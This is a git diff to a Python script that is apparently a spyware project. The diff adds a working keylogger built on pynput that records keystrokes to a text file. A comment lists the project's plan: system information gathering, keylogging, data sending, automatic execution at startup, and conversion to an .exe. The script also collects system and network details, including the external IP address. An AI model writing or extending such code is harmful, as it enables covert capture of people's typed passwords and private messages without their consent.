@@ -1,5 +1,5 @@
 #1. System Information [Done]
-#2. Keylogger
+#2. Keylogger [Done]
 #3. Data Sending
 #4. Automatic execution on system startup
 #5. Convert code to an image/.exe application
@@ -8,11 +8,42 @@
 # execute the respective commands in a windows cmd.
 # -> python -m pip install psutil
 # -> python -m pip install requests
+# -> python -m pip install pynput
 
 import platform
 import psutil
 from datetime import datetime
 from requests import get
+from pynput import keyboard
+from time import strftime,gmtime
+import datetime
+import os
+
+keyloggerfiledir = "C:\\Users\\jorge.duarte\\Desktop\\Python-spyware\\output.txt"
+
+def ExecKeyLogger_OnKeyPress(key):
+    print(datetime.datetime.now().strftime("%H:%M:%S"))
+    try:
+        f=open(keyloggerfiledir,"a")
+        f.write(key.char)
+        #schedule.every(1).minutes.do(sendmail)
+        print('alphanumeric key {0} pressed'.format(key.char))
+    except AttributeError:
+        print('special key {0} pressed'.format(key))
+        #print(keyboard.KeyCode)
+        if key==keyboard.Key.space:
+            f.write(' ')
+        if key==keyboard.Key.enter:
+            f.write(os.linesep)
+        if key==keyboard.Key.backspace:
+            #f.seek(-1,os.SEEK_CUR)
+            f.write('')
+    except:
+      print('Failed to catch numnomeric key')
+
+def ExecKeyLogger_OnRelease(key):
+    if int(datetime.datetime.now().strftime("%H")) not in range(8,23):
+        return False
 
 def GetExternalIP():
     ip = get('https://api.ipify.org').text
@@ -69,4 +100,10 @@ def NetworkInformation():
          
 GetSystemInformation()
 NetworkInformation()
-GetExternalIP()
+#GetExternalIP()
+
+try:
+    with keyboard.Listener(on_press=ExecKeyLogger_OnKeyPress,on_release=ExecKeyLogger_OnRelease) as listener:
+        listener.join()
+except:
+    print("fix this ****")
